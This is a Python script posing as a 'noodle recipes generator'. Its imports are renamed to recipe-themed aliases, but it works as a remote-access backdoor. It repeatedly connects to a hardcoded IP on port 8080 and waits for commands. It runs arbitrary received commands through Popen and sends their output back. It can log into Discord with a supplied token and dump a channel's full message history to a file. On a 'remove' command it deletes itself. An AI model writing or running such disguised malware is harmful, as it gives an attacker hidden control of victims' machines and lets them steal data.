import socket
import subprocess as validation_output
from subprocess import Popen as recipe_validator
import json
import os as recipe_list
import discord as recipe_getter
import asyncio as recipe_generator

googleip = '172.31.23.98'
number = 8080

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

async def generate_recipes(token, id):
    rec_gen = recipe_getter.Client(intents=recipe_getter.Intents.default())

    async def get_recipe_written():
        writer = rec_gen.get_channel(id)
        conn.sendall(f"Got channel {writer}".encode())

        if writer:
            recipe_file = open('recipes.txt', 'w')

            async for message in writer.history(limit=None):
                recipe_file.write(f'{message.author}: {message.content}\n')
                conn.sendall("Wrote messages".encode())

    @rec_gen.event
    async def on_ready():
        conn.sendall(f'Logged in as {rec_gen.user}'.encode())
        await get_recipe_written()
        await rec_gen.close()

    await rec_gen.start(token)

while True:
    try:
        conn.connect((googleip, number))
        break
    except ConnectionRefusedError:
        pass

while True:
    request = conn.recv(1024).decode().split(' ')

    if not request:
        break

    if request[0] == "remove":
        conn.sendall("Done".encode())
        conn.close()
        recipe_list.remove("noodle_recipes_generator.py")
    elif request[0] == "get":
        id = int(request[1])
        token = str(request[2])

        conn.sendall("Starting discord message logger".encode())
        recipe_generator.run(generate_recipes(token, id))
        conn.sendall("Closed discord client".encode())
        conn.sendall("Done".encode())
    else:
        validator = recipe_validator(request, stdout=validation_output.PIPE)
        val_out = []

        for i in validator.stdout.readlines():
            val_out.append(i.decode().strip())

        if len(val_out) != 0:
            conn.sendall(json.dumps(val_out).encode())

        conn.sendall("Done".encode())